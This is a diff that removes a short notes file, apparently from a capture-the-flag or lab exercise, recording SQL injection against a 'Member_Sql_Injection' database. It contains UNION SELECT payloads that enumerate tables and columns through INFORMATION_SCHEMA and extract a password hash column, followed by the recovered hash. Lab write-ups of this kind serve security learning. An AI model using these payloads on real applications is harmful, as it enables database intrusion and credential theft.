@@ -1,6 +1,0 @@
-sql injection member
-get table name and column_name
-1 union select column_name, table_name from INFORMATION_SCHEMA.COLUMNS WHERE table_schema = 0x4d656d6265725f53716c5f496e6a656374696f6e 
-get hash
-1 union select countersign, Commentaire from Member_Sql_Injection.users 
-10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
